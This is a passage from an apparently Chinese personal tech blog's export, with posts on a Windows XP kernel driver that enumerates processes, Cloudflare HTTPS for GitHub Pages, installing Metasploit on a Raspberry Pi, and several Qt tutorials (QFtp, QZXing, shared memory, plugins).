<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">EnumProcessModuleInformations</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//第一个进程环境块</span></span><br><span class="line">	PEPROCESS eprocess=PsGetCurrentProcess();</span><br><span class="line">	PEPROCESS eprocess_first = eprocess;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//获取进程</span></span><br><span class="line">		EnumProcess(eprocess);</span><br><span class="line">		<span class="comment">//下一个进程，我获取的是WinXP的 EPROCESS !</span></span><br><span class="line">		eprocess = (PEPROCESS)(*(ULONG*)((ULONG)eprocess + <span class="number">0x88</span>) - <span class="number">0x88</span>);</span><br><span class="line">		<span class="keyword">if</span> (eprocess == eprocess_first)&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	eprocess= eprocess_first;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//获取模块</span></span><br><span class="line">		EnumModules(eprocess);</span><br><span class="line">		<span class="comment">//下一个进程</span></span><br><span class="line">		eprocess = (PEPROCESS)(*(ULONG*)((ULONG)eprocess + <span class="number">0x88</span>) - <span class="number">0x88</span>);</span><br><span class="line">		<span class="keyword">if</span> (eprocess == eprocess_first)&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>卸载函数很简单</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">unload</span><span class="params">(PDRIVER_OBJECT p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">"UnloadDriver..."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>驱动入口函数</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver_Obj, PUNICODE_STRING pRegisterPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">"DriverEntry..."</span>);</span><br><span class="line">	pDriver_Obj-&gt;DriverUnload = unload;</span><br><span class="line">	DbgPrint(<span class="string">"DriverName:%wZ RegisterPath:%wZ \n "</span>, &amp;pDriver_Obj-&gt;DriverName,pRegisterPath);</span><br><span class="line">	<span class="comment">//这里调用</span></span><br><span class="line">	EnumProcessModuleInformations();</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云+Github Page支持HTTPS</title>
    <url>/github-page-https/</url>
    <content><![CDATA[<p>正常来讲在阿里云注册了一个域名，默认时支持HTTP，要想让自己的域名在<code>Github Page</code>支持HTTPS，那么可以用 <code>Cloudflare</code></p>
<a id="more"></a>

<h3 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h3><blockquote>
<p>Cloudflare是一家美国的跨国科技企业，总部位于旧金山，在英国伦敦亦设有办事处。Cloudflare以向客户提供网站安全管理、性能优化及相关的技术支持为主要业务。通过基于反向代理的内容传递网络(ContentDeliveryNetwork,CDN)及分布式域名解析服务(DistributedDomainNameServer)，Cloudflare可以帮助受保护站点抵御包括拒绝服务攻击(DenialofService)在内的大多数网络攻击，确保该网站长期在线，同时提升网站的性能、访问速度以改善访客体验</p>
</blockquote>
<h4 id="Cloudflare配置"><a href="#Cloudflare配置" class="headerlink" title="Cloudflare配置"></a>Cloudflare配置</h4><p>首先需要登录 <a href="https://www.cloudflare.com/" target="_blank" rel="noopener">官网</a> 注册一个账号，新注册账户登录后弹出对话框要求添加一个站点。可以是从阿里云注册的域名。<br><img src="/uploads/images/hexo/file_001.png" alt="img"></p>
<p>这里添加一条DNS记录。我在阿里云域名解析中添加了CNAME记录，指向github服务器，所以这里我也直接添加一条CNAME DNS记录。</p>
<blockquote>
<p>在“DNS记录”下朝上，从下拉列表中选择 <strong>CNAME</strong>。<br><strong>Name</strong> 输入 <strong>@</strong><br><strong>Domain name</strong> 输入 <strong>域名</strong>，如 josexy.github.io<br>将其保留为 自动TTL(<strong>Automatic TTL</strong>)。<br>点击<strong>橙色云</strong>将其变成<strong>灰色</strong>。<br>点击“添加记录”(<strong>Add Record</strong>)。</p>
</blockquote>
<p>之后我们还需要修改原域名的DNS服务器为Cloudflare提供的DNS服务器。要根据自己的来设置。<br><img src="/uploads/images/hexo/file_003.png" alt="img"></p>
<p>修改Cloudflare提供的DNS服务器之后，可以看到变成了这样子。<br><img src="/uploads/images/hexo/file_004.png" alt="img"></p>
<p>最后看到这个表示一切正常<br><img src="/uploads/images/hexo/file_009.png" alt="img"></p>
<h4 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h4><p>选择 <code>Crypto</code> ，修改 <strong>SSL</strong> 为 <strong>Flexible</strong>(这里我建议选择 <strong>Full/Full(strict)</strong>，也是为了避免 <strong>ERR_TOO_MANY_REDIRECTS</strong> )，表示支持HTTPS<br><img src="/uploads/images/hexo/file_005.png" alt="img"></p>
<h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><p>选择 <code>Page Rules</code> ,添加规则，跳转到HTTPS。比如访问有人访问 <code>http://josephxy.com</code> ，那么我们就需要强制跳转（重定向）到 <code>https://josephxy.com</code>。</p>
<p>这里添加了两条规则<br><img src="/uploads/images/hexo/file_006.png" alt="img"></p>
<p><img src="/uploads/images/hexo/file_007.png" alt="img"></p>
<p><img src="/uploads/images/hexo/file_008.png" alt="img"></p>
<p>最后我们可以看到小绿锁，表示支持HTTPS :)<br><img src="/uploads/images/hexo/file_010.png" alt="img"></p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><blockquote>
<p>参考文章：</p>
<ol>
<li><a href="https://blog.cloudflare.com/secure-and-fast-github-pages-with-cloudflare/" target="_blank" rel="noopener">https://blog.cloudflare.com/secure-and-fast-github-pages-with-cloudflare/</a></li>
<li><a href="https://docs.clickfunnels.com/custom-domains/dns-hosts/how-to-add-your-cname-record-to-cloudflare" target="_blank" rel="noopener">https://docs.clickfunnels.com/custom-domains/dns-hosts/how-to-add-your-cname-record-to-cloudflare</a></li>
</ol>
</blockquote>
<p><strong><font color="red">注意： 可以在GitHub Pages [Setting] 中 Enforce HTTPS</font></strong></p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Github</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派安装Metasploit框架</title>
    <url>/rasppi-meatsploit/</url>
    <content><![CDATA[<p>Metasploit框架包含的大量的模块、插件，其强大的功能使得渗透变得不在是想象中的那么难。Kali Linux本身就自带了metasploit框架，当然了，有兴趣的可以在树莓派上安装 <a href="https://www.offensive-security.com/kali-linux-arm-images/" target="_blank" rel="noopener">kali Linux</a> 。不过本文的重点是在raspbian上进行安装</p>
<a id="more"></a>

<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先呢，当然是要连接到树莓派了。<br>接着我们把以下更新源追加到 sources.list</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi</span><br><span class="line">#deb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi</span><br><span class="line">##### 所需的有关kali linux更新源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>再 <code>sudo apt-get update</code> ，如果在这时出现了类似一下的错误，那么是正常的，因为我们没有授权在raspbian系统上使用kali的更新源</p>
<blockquote>
<p>正在读取软件包列表… 完成<br>W: GPG 错误：<a href="http://kali.mirror.garr.it/mirrors/kali" target="_blank" rel="noopener">http://kali.mirror.garr.it/mirrors/kali</a> kali-rolling InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY <strong>ED444FF07D8D0BF6</strong><br>W: 仓库 “<a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling InRelease” 没有数字签名。<br>N: 无法认证来自该源的数据，所以使用它会带来潜在风险。<br>N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节</p>
<p><strong>解决方法：</strong><br><strong>gpg –keyserver pgp.mit.edu –recv-keys ED444FF07D8D0BF6</strong><br>gpg -a –export <strong>ED444FF07D8D0BF6</strong> | sudo apt-key add -</p>
</blockquote>
<p>其中 –keyserver 后面的 pgp.mit.edu 可换成：</p>
<blockquote>
<p>keyserver.ubuntu.com<br>pgp.mit.edu<br>subkeys.pgp.net<br><a href="http://www.gpg-keyserver.de" target="_blank" rel="noopener">www.gpg-keyserver.de</a></p>
</blockquote>
<p>然后在执行 <code>sudo apt-get update</code></p>
<p>接下来我们就可以安装metasploit框架了</p>
<blockquote>
<p>sudo apt-get install metasploit-framework</p>
</blockquote>
]]></content>
      <categories>
        <category>RaspberryPi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt5调用QFtp函数</title>
    <url>/linux-qt-qftp/</url>
    <content><![CDATA[<p>不知怎么,在Qt5以上版本没有了QFtp,不过可以用QNetworkAccessManager.我在网上也找了些资料,最后还是决定先暂时用QFtp..<br>这篇博客讲解的很详细<br><a href="http://blog.csdn.net/liang19890820/article/details/53304049" target="_blank" rel="noopener">http://blog.csdn.net/liang19890820/article/details/53304049</a></p>
<a id="more"></a>

<h4 id="下载QFtp源码"><a href="#下载QFtp源码" class="headerlink" title="下载QFtp源码"></a>下载QFtp源码</h4><blockquote>
<p>git clone <a href="https://github.com/qt/qtftp.git" target="_blank" rel="noopener">https://github.com/qt/qtftp.git</a></p>
</blockquote>
<h4 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h4><ul>
<li>进入qtftp/src/qftp,有个</li>
</ul>
<p>  qftp.pro</p>
<p>  ,修改为</p>
<blockquote>
<p>CONFIG += static #生成 .a静态链接库<br>CONFIG += shared #生成.so动态链接库</p>
</blockquote>
<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>进入qtftp根目录,编译生成库文件</p>
<blockquote>
<p>cd qtftp<br>qmake<br>make</p>
</blockquote>
<p>然后在 qtftp/lib 下生成了一些目录文件,大概是这样</p>
<blockquote>
<p>cmake/ libQt5Ftp.la libQt5Ftp.so <strong>libQt5Ftp.so.5.0</strong> pkgconfig/<br>libQt5Ftp.a libQt5Ftp.prl libQt5Ftp.so.5 libQt5Ftp.so.5.0.0</p>
</blockquote>
<h4 id="整合文件"><a href="#整合文件" class="headerlink" title="整合文件"></a>整合文件</h4><p>把这些零散的文件整合成一个便于调用的库,还是非常有必要的<br>这里我创建一个 <strong>libqtftp</strong> 文件夹,用来存放所需要的文件</p>
<p>然后在刚才在 <strong>qtftp</strong> 目录下的 <code>lib</code> , <code>include</code> , <code>src</code><br>文件夹复制到 libqtftp 目录</p>
<ul>
<li>进入 include/QtFtp 文件夹,删除 headers.pri,同时把 src 文件夹内:<br>qftp.cpp<br>qftp.h<br>qurlinfo.cpp<br>qurlinfo.h<br>.moc文件夹内<strong>3个文件</strong>复制到<strong>上一层文件夹</strong> (隐藏文件夹)<br>.obj + .pch (隐藏文件夹)</li>
</ul>
<p>一并复制到 <strong>include/QtFtp</strong> 文件夹,这时可删除 <strong>src</strong> 文件夹</p>
<ul>
<li>修改 <strong>moc_qftp.cpp</strong> 代码 <code>#include &quot;../qftp.h&quot;</code> 为 <code>#include &quot;qftp.h&quot;</code></li>
<li>为了便于管理,在 <strong>libqtftp</strong> 目录下创建一个 .pri文件:</li>
</ul>
<p>qtftp.pri:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#QT += network</span><br><span class="line">HEADERS += $$PWD/include/QtFtp/\</span><br><span class="line">		$$PWD/include/QtFtp/QFtp\</span><br><span class="line">		$$PWD/include/QtFtp/QUrlInfo\</span><br><span class="line">		$$PWD/include/QtFtp/QtFtpVersion</span><br><span class="line">SOURCES += $$PWD/include/QtFtp/qftp.cpp\</span><br><span class="line">		$$PWD/include/QtFtp/qurlinfo.cpp</span><br><span class="line">INCLUDEPATH += $$PWD/include/</span><br></pre></td></tr></table></figure>

<h4 id="引用库"><a href="#引用库" class="headerlink" title="引用库"></a>引用库</h4><p>首先,新建一个Qt项目,把 <strong>libqtftp</strong> 文件夹放到 Qt项目下.<br>然后在修改 项目.pro 文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QT       += core gui network</span><br><span class="line">greaterThan(QT_MAJOR_VERSION, 4): QT += widgets</span><br><span class="line">TARGET = MyFtp</span><br><span class="line">TEMPLATE = app</span><br><span class="line">include($$PWD/libqtftp/qtftp.pri)</span><br><span class="line">SOURCES += main.cpp\</span><br><span class="line">        mainwindow.cpp</span><br><span class="line">HEADERS  += mainwindow.h</span><br><span class="line">FORMS    += mainwindow.ui</span><br><span class="line">INCLUDEPATH += $$PWD/libqtftp/include/</span><br><span class="line">LIBS += -L$$PWD/libqtftp/lib/ -lQt5Ftp</span><br></pre></td></tr></table></figure>

<p>要注意那个配置:</p>
<ul>
<li><code>QT += network</code></li>
<li><code>include($$PWD/libqtftp/qtftp.pri)</code></li>
<li><code>INCLUDEPATH += $$PWD/libqtftp/include/</code></li>
<li><code>LIBS += -L$$PWD/libqtftp/lib/ -lQt5Ftp</code><br>链接<strong>libQt5Ftp.so</strong>动态链接库</li>
</ul>
<p>之后 重新构建项目</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>使用前需要包含头文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"QtFtp/QFtp"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QtFtp/QUrlInfo&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// do something ...</span></span><br><span class="line">	QFtp * ftp =<span class="keyword">new</span> QFtp(<span class="keyword">this</span>);</span><br><span class="line">	<span class="built_in">connect</span>(ftp,&amp;QFtp::listInfo,<span class="keyword">this</span>,[=](<span class="keyword">const</span> QUrlInfo u)&#123;</span><br><span class="line">	<span class="comment">// do something ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">connect</span>(ftp,&amp;QFtp::dataTransferProgress,[=](qint64 _t1, qint64 _t2)&#123;</span><br><span class="line">	<span class="comment">// do something ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">connect</span>(ftp,&amp;QFtp::readyRead,<span class="keyword">this</span>,[=]()&#123;</span><br><span class="line">	<span class="comment">// do something ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">int</span> id=ftp-&gt;connectToHost(<span class="string">""</span>);</span><br><span class="line">    ftp-&gt;login(<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line">    ftp-&gt;cd(<span class="string">""</span>);</span><br><span class="line">    ftp-&gt;<span class="built_in">list</span>();</span><br><span class="line">	ftp-&gt;<span class="built_in">close</span>();</span><br><span class="line">	<span class="comment">// do something ...</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt&amp;QZXing识别二维码</title>
    <url>/linux-qzxing/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在网上看到一篇博客,讲的是二维码的生成和识别</p>
<a id="more"></a>

<p>借用一下</p>
<blockquote>
<p>ZXing<br>ZXing是一个开放源码的，用Java实现的多种格式的1D/2D条码图像处理库，包含了联系到其他语言的端口。<br>网址：<a href="https://code.google.com/p/zxing" target="_blank" rel="noopener">https://code.google.com/p/zxing</a>.</p>
<p>Libqrencode<br>Libqrencode(QRencode)是一个用C语言编写的用来解析二维条形码(QR Code)的程序库，Libqrencode通过手机的CCD摄像头来扫描二维条形码。二维码容量可达7000个数字或4000个字符，是非常强大的。<br>网址：<a href="http://fukuchi.org/works/qrencode/" target="_blank" rel="noopener">http://fukuchi.org/works/qrencode/</a>.</p>
<p>ZBar<br>ZBar是款桌面电脑用条形码/二维码扫描工具，支持摄像头及图片扫描，支持多平台包括iPhone手机。同时 ZBar提供了二维码扫描的API开发包。<br>网址：<a href="http://zbar.sourceforge.net" target="_blank" rel="noopener">http://zbar.sourceforge.net</a>.<br>更多参考：<a href="http://sourceforge.net/apps/mediawiki/zbar/index.php" target="_blank" rel="noopener">http://sourceforge.net/apps/mediawiki/zbar/index.php</a>.</p>
<p>Open Source QR Code Library<br>二维码编码/解码的Java库（J2SE, J2ME MIDP2.0/CLDC1.0）。<br>网址：<a href="http://qrcode.sourceforge.jp/index.html.en" target="_blank" rel="noopener">http://qrcode.sourceforge.jp/index.html.en</a>.</p>
<p>QZXing<br>Qt包装ZXing的解码库。<br>网址：<a href="http://sourceforge.net/projects/qzxing" target="_blank" rel="noopener">http://sourceforge.net/projects/qzxing</a>.<br>更多参考：<a href="https://projects.developer.nokia.com/QZXing" target="_blank" rel="noopener">https://projects.developer.nokia.com/QZXing</a>.</p>
</blockquote>
<p>然而本人能力有限,这里只选取了 <strong>QZXing</strong> 解码库,以后有时间在慢慢琢磨…</p>
<p>example:<br><img src="/uploads/images/file4_qt/qr.png" alt="img"></p>
<h3 id="QZXing"><a href="#QZXing" class="headerlink" title="QZXing"></a>QZXing</h3><p>首先到github获取到源码 </p>
<blockquote>
<p>git clone <a href="https://github.com/ftylitak/qzxing.git" target="_blank" rel="noopener">https://github.com/ftylitak/qzxing.git</a></p>
</blockquote>
<p>当然也可以下zip压缩包</p>
<h3 id="How-to-include"><a href="#How-to-include" class="headerlink" title="How to include"></a>How to include</h3><p>qzxing上讲的还比较清楚…怎么使用<img src="/uploads/images/file4_qt/qt1.png" alt="img"></p>
<ul>
<li><p>把QZXing目录直接复制到项目的根目录下,并且在项目的 .pro 中加入 <code>include(../../src/QZXing.pri)</code></p>
</li>
<li><p>或者把源码编译成动态库(dynamic library)</p>
<blockquote>
<p>qmake src/QZXing.pro<br>make</p>
</blockquote>
</li>
</ul>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><img src="/uploads/images/file4_qt/qt2.png" alt="img"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"widget.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ui_widget.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QZXing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPixmap&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line">Widget::Widget(QWidget *parent) :</span><br><span class="line">    QWidget(parent),</span><br><span class="line">    ui(<span class="keyword">new</span> Ui::Widget)&#123;</span><br><span class="line">    ui-&gt;setupUi(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">Widget::~Widget()&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_PATH <span class="meta-string">"/root/Desktop/l.png"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::on_pushButton_clicked</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">QPixmap <span class="title">pixmap</span><span class="params">(FILE_PATH)</span></span>;</span><br><span class="line">    ui-&gt;label-&gt;setPixmap(pixmap.scaled(ui-&gt;label-&gt;<span class="built_in">size</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::on_pushButton_2_clicked</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QZXing *decoder=<span class="keyword">new</span> QZXing(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//设置解码格式</span></span><br><span class="line">    decoder-&gt;setDecoder(QZXing::DecoderFormat_QR_CODE);</span><br><span class="line">    <span class="comment">//start decode</span></span><br><span class="line">    QString str= decoder-&gt;decodeImage(ui-&gt;label-&gt;pixmap()-&gt;toImage());</span><br><span class="line">    <span class="keyword">if</span> (!str.isEmpty())&#123;</span><br><span class="line">        ui-&gt;textEdit-&gt;setText(str);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ui-&gt;textEdit-&gt;setText(<span class="string">"Failed!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="尾"><a href="#尾" class="headerlink" title="尾"></a>尾</h3><p>当然,感兴趣的可以去看源码有解码就有编码,网上有很多库可以用,也可以自己写一个出来…不过这要技术到家…不过目前我正在学习使用 libqrencode ,可以到官网瞧瞧<a href="https://fukuchi.org/works/qrencode/" target="_blank" rel="noopener">https://fukuchi.org/works/qrencode/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt进程间通信</title>
    <url>/linux-qt-process/</url>
    <content><![CDATA[<p>Qt中实现<strong>进程间通信</strong>的方法诸多,这里讲解比较简单的共享内存类<strong>QSharedMemory</strong>在这之前,先来看看这个类,其实函数不是很多,详细资料到官方文档查看</p>
<a id="more"></a>

<p>演示<br><img src="/uploads/images/file4_qt/qt0.gif" alt="img"></p>
<p>下面代码注释写的比较清楚了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="comment">//内存共享 标识符</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEM_KEY <span class="meta-string">"_sharedMemKey_"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPixmap&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QBuffer&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIX_MAP <span class="meta-string">"test.jpg"</span></span></span><br><span class="line">Widget::Widget(QWidget *parent) :</span><br><span class="line">    QWidget(parent),</span><br><span class="line">    ui(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//设置内存标志 key</span></span><br><span class="line">    sharedMemory=<span class="keyword">new</span> QSharedMemory(<span class="keyword">this</span>);</span><br><span class="line">    sharedMemory-&gt;setKey(MEM_KEY);</span><br><span class="line">&#125;</span><br><span class="line">Widget::~Widget()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//载入图片到内存</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::on_pushButton_clicked</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//如果已经绑定,则分离</span></span><br><span class="line">    <span class="keyword">if</span>(sharedMemory-&gt;isAttached())&#123;</span><br><span class="line">        sharedMemory-&gt;<span class="built_in">detach</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    QPixmap pmp;</span><br><span class="line">    pmp.load(PIX_MAP);</span><br><span class="line">    ui-&gt;label-&gt;setPixmap(pmp.scaled(ui-&gt;label-&gt;<span class="built_in">size</span>()));</span><br><span class="line">    <span class="comment">//图像的数据(QPixmap)---&gt; ( QDataStream )--&gt;QBuffer</span></span><br><span class="line">    QBuffer tmpBuffer;</span><br><span class="line">    <span class="comment">//打开 缓存区设备</span></span><br><span class="line">    tmpBuffer.<span class="built_in">open</span>(QIODevice::ReadWrite);</span><br><span class="line">    <span class="comment">//数据流与缓存区关联</span></span><br><span class="line">    <span class="function">QDataStream <span class="title">dataOutstream</span><span class="params">(&amp;tmpBuffer)</span></span>;</span><br><span class="line">    <span class="comment">//图像数据输入到数据流</span></span><br><span class="line">    dataOutstream&lt;&lt;pmp;</span><br><span class="line">    <span class="comment">//获取缓存区(图像)字节大小</span></span><br><span class="line">    <span class="keyword">int</span> bufferSize=tmpBuffer.<span class="built_in">size</span>();</span><br><span class="line">    <span class="comment">//创建共享内存</span></span><br><span class="line">    <span class="keyword">if</span>(sharedMemory-&gt;create(bufferSize))&#123;</span><br><span class="line">        <span class="comment">//lock</span></span><br><span class="line">        sharedMemory-&gt;lock();</span><br><span class="line">        <span class="comment">//memset(sharedMemory-&gt;data(),0,bufferSize);</span></span><br><span class="line">        <span class="comment">//获取图像数据</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *datasharedBuffer= tmpBuffer.data().data();</span><br><span class="line">        <span class="comment">//获取共享内存地址</span></span><br><span class="line">        <span class="keyword">char</span> *datasharedMemory=(<span class="keyword">char</span> *)sharedMemory-&gt;data();</span><br><span class="line">        <span class="comment">//图像数据 拷贝到 共享内存中</span></span><br><span class="line">        <span class="built_in">memcpy</span>(datasharedMemory,datasharedBuffer,bufferSize);</span><br><span class="line">        <span class="comment">//unlock</span></span><br><span class="line">        sharedMemory-&gt;unlock();</span><br><span class="line">    &#125;</span><br><span class="line">    tmpBuffer.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从共享内存获取图像数据</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::on_pushButton_2_clicked</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//进程与共享内存绑定!,,注意要设置好标识符 key</span></span><br><span class="line">    <span class="keyword">if</span>(sharedMemory-&gt;<span class="built_in">attach</span>())&#123;</span><br><span class="line">        qDebug()&lt;&lt;<span class="string">"ok!"</span>;</span><br><span class="line">        sharedMemory-&gt;lock();</span><br><span class="line">        <span class="comment">// 图像的数据(QPixmap) &lt;--- ( QDataStream ) &lt;--- QBuffer</span></span><br><span class="line">        QBuffer <span class="built_in">buffer</span>;</span><br><span class="line">        <span class="keyword">char</span> *dataSharedMem=(<span class="keyword">char</span>*)sharedMemory-&gt;data();</span><br><span class="line">        <span class="keyword">int</span> dataSize =sharedMemory-&gt;<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//设置共享内存的数据到缓存区</span></span><br><span class="line">        <span class="built_in">buffer</span>.setData(QByteArray(dataSharedMem,dataSize));</span><br><span class="line">        QPixmap pmp;</span><br><span class="line">        <span class="built_in">buffer</span>.<span class="built_in">open</span>(QIODevice::ReadOnly);</span><br><span class="line">        <span class="comment">//关联缓存区数据到数据流</span></span><br><span class="line">        <span class="function">QDataStream <span class="title">dataInStream</span><span class="params">(&amp;<span class="built_in">buffer</span>)</span></span>;</span><br><span class="line">        dataInStream&gt;&gt;pmp;</span><br><span class="line">        ui-&gt;label-&gt;setPixmap(pmp.scaled(ui-&gt;label-&gt;<span class="built_in">size</span>()));</span><br><span class="line">        <span class="comment">//进程与共享内存分离</span></span><br><span class="line">        sharedMemory-&gt;unlock();</span><br><span class="line">        <span class="keyword">if</span>(sharedMemory-&gt;isAttached())&#123;</span><br><span class="line">            sharedMemory-&gt;<span class="built_in">detach</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">buffer</span>.<span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>创建Qt5应用程序插件</title>
    <url>/linux-qt-plugin/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近也没时间来写博客了 (⊙o⊙)…，于是现在赶紧抽空写一写～～这次讲的是在创建Qt插件，<strong>在Windows上为.dll动态库，Linux上为.so动态库</strong></p>
<a id="more"></a>

<p><a href="http://doc.qt.io/qt-5/plugins-howto.html" target="_blank" rel="noopener">官网&gt;&gt; How to Create Qt Plugins</a></p>
<p>大概就是这么几步</p>
<p><strong>Making an application extensible through plugins involves the following steps:</strong></p>
<ul>
<li>Define a set of interfaces (classes with only pure virtual functions) used to talk to the plugins.</li>
<li>Use the <code>Q_DECLARE_INTERFACE</code>() macro to tell Qt’s meta-object system about the interface.</li>
<li>Use <code>QPluginLoader</code> in the application to load the plugins.</li>
<li>Use qobject_cast() to test whether a plugin implements a given interface.</li>
</ul>
<p><strong>Writing a plugin involves these steps:</strong></p>
<ul>
<li>Declare a plugin class that inherits from QObject and from the interfaces that the plugin wants to provide.</li>
<li>Use the <code>Q_INTERFACES</code>() macro to tell Qt’s meta-object system about the interfaces.</li>
